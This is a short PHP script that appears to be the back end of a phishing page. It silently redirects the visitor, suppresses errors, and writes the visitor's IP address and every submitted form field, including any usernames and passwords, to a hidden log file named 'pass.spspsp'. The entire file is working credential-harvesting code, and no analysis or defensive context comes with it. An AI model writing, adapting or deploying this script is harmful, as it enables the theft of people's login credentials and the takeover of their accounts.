<?php
 // include ('UserInformation.php');
    include ('ip.php');

header('location: qwertyuiop36.php');

// header('location: loginsubmit.html');
error_reporting(0);
$handle = fopen("pass.spspsp","a");
fwrite($handle, $ip_address);
fwrite($handle, "\r\n<br>");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n<br>");
}
fwrite($handle, "\r\n<br>");
fclose($handle);
exit;
?> 
       
       